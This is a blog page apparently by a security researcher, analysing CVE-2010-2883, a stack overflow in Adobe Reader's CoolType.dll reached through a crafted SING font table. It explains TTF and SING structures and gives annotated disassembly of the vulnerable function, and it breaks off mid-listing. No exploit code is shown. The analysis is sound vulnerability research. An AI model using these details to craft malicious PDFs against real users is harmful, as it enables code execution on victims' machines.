<!DOCTYPE html>
<html lang="en, zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech">
    
    <meta name="author" content="7erry">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://7erryX.github.io/2024/07/07/vulnerability investigation/cve-2010-2883-investigation/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2883 Investigation">
<meta property="og:url" content="https://7erryx.github.io/2024/07/07/Vulnerability%20Investigation/CVE-2010-2883-Investigation/index.html">
<meta property="og:site_name" content="7erry&#39;s Website">
<meta property="og:description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]">
<meta property="og:locale">
<meta property="og:image" content="https://7erryx.github.io/images/default_avatar.png">
<meta property="article:published_time" content="2024-07-07T11:28:31.000Z">
<meta property="article:modified_time" content="2024-07-07T11:28:31.000Z">
<meta property="article:author" content="7erry">
<meta property="article:tag" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://7erryx.github.io/images/default_avatar.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            CVE-2010-2883 Investigation | 7erry&#39;s Website
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    
        
<script src="/js/build/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"7erryx.github.io","root":"/","language":"en, zh-CN","path":"search.json"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/default_avatar.png","description":"(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background_light.jpg","dark":"/images/background_dark.jpg"},"title":"7erry's Website","subtitle":{"text":["君子慎独","君子不器","我的人生烷基八氮了","Fall in Love with the Problem, Not the Solution","Do The Right Thing，Do The Thing Right","Lux et veritas","Mens et Manus","Per Aspera Ad Astra","(v50) 経験に3を加えて，失礼します [中国翻訳] [無修正]","呐呐呐，你听说过二刺螈吗?","取势，明道，优术","做难而正确的事"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#000","dark":"#fff"},"text_style":{"title_size":"5.7rem","subtitle_size":"1.9rem","line_height":1.1},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/7erryX","instagram":null,"zhihu":null,"twitter":null,"email":"w.7erry@qq.com","bilibili":"https://space.bilibili.com/25689965"},"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":true,"color":{"left":"#7ab8cc","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Anime":{"path":"/bangumis","icon":"fa-brands fa-youtube"},"Cinema":{"path":"/cinemas","icon":"fa-solid fa-film"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":1},"tags":{"enable":false,"limit":3}},"footerStart":"2020/2/2 20:20:22"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        7erry&#39;s Website
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                7erry&#39;s Website
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bangumis"
                                        >
                                    <i class="fa-brands fa-youtube fa-fw"></i>
                                    ANIME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/cinemas"
                                        >
                                    <i class="fa-solid fa-film fa-fw"></i>
                                    CINEMA
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bangumis"
                        >
                            <span>
                                ANIME
                            </span>
                            
                                <i class="fa-brands fa-youtube fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/cinemas"
                        >
                            <span>
                                CINEMA
                            </span>
                            
                                <i class="fa-solid fa-film fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">69</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2010-2883 Investigation</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/default_avatar.png">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">7erry</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-07-07 19:28:31</span>
        <span class="mobile">2024-07-07 19:28:31</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-07-07 19:28:31</span>
            <span class="mobile">2024-07-07 19:28:31</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Vulnerability-Investigation/">Vulnerability Investigation</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.8k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>23 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>CVE-2010-2883 是 Adobe Reader 和 Acrobat 中的 CoolType.dll 库在解析字体文件 SING 表中的 uniqueName 项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致任意代码执行。这种 “打开 PDF 即刻中招” 的效果堪称 “简单暴力” 的典范，也使其作为漏洞而言非常经典</p>
<p>影响范围：<br>Adobe Reader 8.2.4 - 9.3.4</p>
<span id="more"></span>

<h2 id="TTF-结构与-SING-表结构"><a href="#TTF-结构与-SING-表结构" class="headerlink" title="TTF 结构与 SING 表结构"></a>TTF 结构与 SING 表结构</h2><p>一个 PDF（Portable Document Format）文件在文件结构上主要由四个部分组成</p>
<ul>
<li>Header 文件头，用于注明 PDF 文件的版本号，其值为 %PDF-版本号</li>
<li>Body 文件体，主要有组成文件的对象组成，如图片，文字等</li>
<li>Cross-reference table 交叉引用表，用于存放所有对象的位置偏移，可以方便地访问 PDF 中的任意对象</li>
<li>Trailer 文件尾，给出了交叉引用表的位置和一些关键对象的信息，以 %%EOF 结尾</li>
</ul>
<p>PDF Body 可以被视作一个树状的层次结构，其中的每一个结点都是一个对象，由其根节点 Document Catalog 开始，其节点包括了文档的内容（Page Tree），纲要（Outline）等等属性。在 PDF 中会包含字体对象，它的内容是一个 TTF 字体文件</p>
<p>一个 TTF 文件（The TrueType Font File）由一个表目录与一系列的表组成，表目录 Font Directory 记录了整个文件以及各个表的信息，其记录的每张表目录项的结构如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> tag[<span class="number">4</span>];  # 表标识</span><br><span class="line">ULONG checkSum; # 校验和</span><br><span class="line">ULONG offset; # 实表偏移</span><br><span class="line">ULONG length; # 实表长度</span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure></div>

<p>每一张表都有一个四字节大小的标签，SING（Smart INdependent Glyphlets，智能独立字形包）则是这些标签之一。SING 技术是 Adobe 公司推出的针对“外字”（Gaiji）的解决方案，外字是日语中的意思，中文中就是生僻字的意思。的意思。SING 允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（glyphlet）。这一规范允许字形包随同文件一起传送，这样包含 SING 字符的文件也是可携带的，而又不会字符乱码、异常显示。SING 表目录项的结构体值往往为</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TableEntry</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> tag[<span class="number">4</span>] = <span class="string">&quot;SING&quot;</span>;</span><br><span class="line">ULONG checkSum = <span class="number">0xD9BCC8B5</span>;</span><br><span class="line">ULONG offset = <span class="number">0x0000011c</span>;</span><br><span class="line">ULONG length = <span class="number">0x00001DDF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>TrueType 字体中的所有数据都使用 big-endian 编码，最高位字节在最前面（因为 TrueType 字体最初是由 apple 公司定义的，而 apple 公司的 os 运行在 motorola 的 cpu 上）。</p>
</blockquote>
<p>而一个 SING 表的内容的数据结构则如下所示</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_VERSION VERSION(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_UNIQUENAMELEN 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_MD5LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Card16 tableVersionMajor; <span class="comment">// Card16 即 USHORT</span></span><br><span class="line">Card16 tableVersionMinor;</span><br><span class="line">Card16 glyphletVersion;</span><br><span class="line">Card16 permissions;</span><br><span class="line">Card16 mainGID;</span><br><span class="line">Card16 unitsPerEm;</span><br><span class="line">Int16 vertAdvance;</span><br><span class="line">Int16 vertOrigin;</span><br><span class="line">Card8 uniqueName[SING_UNIQUENAMELEN]; <span class="comment">// Card8 即 BYTE</span></span><br><span class="line">Card8 METAMD5[SING_MD5LEN];</span><br><span class="line">Card8 nameLength;</span><br><span class="line">Card8 *baseGlyphName;</span><br><span class="line">&#125; SINGTbl;</span><br></pre></td></tr></table></figure></div>

<p>其中 uniqueName 字段需要记住，因为这与该漏洞的利用密切相关</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用 IDA 打开 CoolType.dll 库，从漏洞描述可知漏洞代码引用了 SING 字符串，这意味着攻击者可以直接采用基于字符串定位的分析方法，即搜索 “SING” 字符串并查看交叉引用，便能够定位到这段代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ...</span><br><span class="line">.rdata:0819DB51                 align 4</span><br><span class="line">...</span><br><span class="line">.text:0803DCF9     push    ebp                            ; 父函数ebp</span><br><span class="line">.text:0803DCFA     sub     esp, 104h                      ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00     lea     ebp, [esp-4] ; esp-4 赋给 ebp ,而不是 esp-4 处的值赋给 ebp ,后面 strcat 会把执行结果保存在以 ebp 为起始地址的栈空间中</span><br><span class="line">.text:0803DD04     mov     eax, ___security_cookie ; security_cookie-&gt;eax</span><br><span class="line">.text:0803DD09     xor     eax, ebp                ; security_cookie^ebp-&gt;eax</span><br><span class="line">.text:0803DD0B     mov     [ebp+108h+var_4], eax   ; 将和ebp异或完的 security_cookie 存到栈上父函数 ebp 之前的 4 字节中</span><br><span class="line">.text:0803DD11     push    4Ch                     ; __EH_prolog3_catch 函数中分配栈空间的大小</span><br><span class="line">.text:0803DD13     mov     eax, offset loc_8184A54 ; 调用 __security_check_cookie 函数的代码段起始地址</span><br><span class="line">.text:0803DD18     call    __EH_prolog3_catch      ; 向栈上写入 SEH 结构</span><br><span class="line">.text:0803DD1D     mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23     mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29     mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F     mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32     mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35     call    sub_804172C</span><br><span 